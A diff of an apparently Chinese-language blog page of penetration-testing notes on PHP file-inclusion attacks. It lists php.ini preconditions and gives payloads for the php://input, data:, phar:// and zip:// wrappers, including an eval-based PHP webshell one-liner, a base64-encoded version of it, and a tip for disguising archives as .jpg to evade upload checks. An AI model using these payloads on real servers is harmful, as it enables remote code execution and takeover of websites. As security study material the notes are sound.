@@ -154,24 +154,25 @@ if (!doNotTrack) {
 </ul>
 <p>​</p>
 <h2 id="关键phpini参数分析">关键php.ini参数分析</h2>
-<p><strong>allow_url_include</strong>    默认关闭 since php5.2</p>
+<p><strong>allow_url_include</strong>    自php5.2 默认关闭</p>
 <blockquote>
 <p>此选项允许有以下功能include，include_once，require，require_once使用URL的fopen封装。Whether to allow <strong>include/require</strong> to open URLs (like http:// or ftp://) as files.</p>
 <p>This setting requires allow_url_fopen to be on.  //需要allow_url_fopen开启才能开启</p>
 </blockquote>
-<p><strong>allow_url_fopen</strong>    默认开启 since php5.2</p>
+<p><strong>allow_url_fopen</strong>    自php5.2 默认开启</p>
 <blockquote>
 <p>Whether to allow the treatment of URLs (like http:// or ftp://) as files.</p>
 <p>限制 fopen， file_get_contents使用</p>
 </blockquote>
-<p>​</p>
+<p>PS:</p>
 <blockquote>
 <p>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。</p>
 <p>include会包含进入代码内，再解析执行一次。</p>
 </blockquote>
+<p><strong>使用<a href="https://www.php.net/manual/zh/ini.core.php#ini.open-basedir">open_basedir</a> 来限制哪些目录可以被 PHP 使用</strong></p>
 <p>​</p>
 <p><strong>不能通过.htaccess修改以上两个php_flag型的配置</strong></p>
-<p><a href="https://www.php.net/manual/en/configuration.changes.php#configuration.changes">How to change configuration settings</a></p>
+<p>参见 <a href="https://www.php.net/manual/en/configuration.changes.modes.php">Where a configuration setting may be set</a></p>
 <blockquote>
 <p>&lsquo;allow_url_include&rsquo; is a &lsquo;PHP_INI_SYSTEM&rsquo; directive and hence cannot be set with the mod_php5 &lsquo;php_flag&rsquo;.</p>
 </blockquote>
@@ -244,7 +245,7 @@ include.php?file=php://filter/read=convert.base64-encode/resource=/etc/php5/apac
 <h3 id="phpinput">php://input</h3>
 <p><strong>条件</strong> <code>allow_url_include on</code></p>
 <p><strong>Payload</strong></p>
-<p>post内容填写一句话，不写键值对形式</p>
+<p>post内容填写一句话，非键值对形式</p>
 <pre><code>POST /include.php?file=php://input HTTP/1.1
 Host: kokoisko.xyz:8001
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -256,14 +257,6 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Fi
 <pre><code>配置栏填写：
 &lt;O&gt;&lt;?php @eval($_POST[a]);?&gt;&lt;/O&gt;
 </code></pre><p>​</p>
-<p>​</p>
-<p>渗透境界：</p>
-<blockquote>
-<p><strong>无文件 input、data</strong></p>
-<p>无进程 进程注入</p>
-<p>无端口 icmp</p>
-</blockquote>
-<p>​</p>
 <h3 id="data协议">data:协议</h3>
 <p><strong>条件</strong>     <code>allow_url_fopen on</code>  &amp;&amp;  <code>allow_url_include on</code></p>
 <p><strong>格式</strong></p>
@@ -273,21 +266,27 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Fi
 #或者base64编码
 include.php?file=data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbYV0pOyAgPz4=
 </code></pre><p>​</p>
+<p>渗透境界：</p>
+<blockquote>
+<p><strong>无文件 input、data</strong></p>
+<p>无进程 进程注入</p>
+<p>无端口 icmp</p>
+</blockquote>
+<p>​</p>
 <h3 id="phar协议">phar://协议</h3>
-<p>读取压缩包内的文件。</p>
-<p>借助对压缩包文件的允许上传，也可以将tar/zip后缀改名为jpg等绕过后缀检测（无碍phar协议使用）。</p>
-<p><strong>条件</strong> PHP&gt;=<strong>5.3.0</strong></p>
-<p>支持<strong>tar/zip</strong>，相对路径/绝对路径</p>
+<p>读取tar/zip包内的文件。</p>
+<p>借助对压缩包文件的允许上传，也可以将后缀改为jpg等，绕过后缀检测（无碍phar协议使用）。</p>
+<p><strong>条件</strong> PHP&gt;=<strong>5.3.0</strong>，支持<strong>tar/zip</strong>，相对路径/绝对路径</p>
 <p><strong>Payload</strong></p>
 <pre><code>test.php?filename=phar://&lt;zipfile.zip&gt;/[&lt;dir&gt;/]&lt;filename&gt;
 </code></pre><p>​</p>
 <h3 id="zip协议">zip://协议</h3>
-<p><strong>条件</strong>  相对路径、绝对路径</p>
+<p><strong>条件</strong>  相对路径/绝对路径皆可</p>
+<p>压缩包不要求zip后缀，可以修改为jpg等后缀</p>
 <p><strong>格式</strong></p>
 <pre><code>zip://绝对路径#[&lt;dirname&gt;/]&lt;filename.txt&gt;
-</code></pre><p>压缩包不要求zip后缀，可以修改为jpg等后缀</p>
-<p><strong>Payload</strong></p>
-<pre><code>include.php?file=zip://C:/MyProgram/phpstudy_pro/WWW/shell.jpg%23a.php
+</code></pre><p><strong>Payload</strong></p>
+<pre><code>include.php?file=zip://C:/phpstudy_pro/WWW/shell.jpg%23shell.php
 </code></pre><p>注意：<code>#</code>在url为截断结束符，发送url编码<code>%23</code>代替</p>
 <p>​</p>
 <h3 id="类似协议">类似协议</h3>
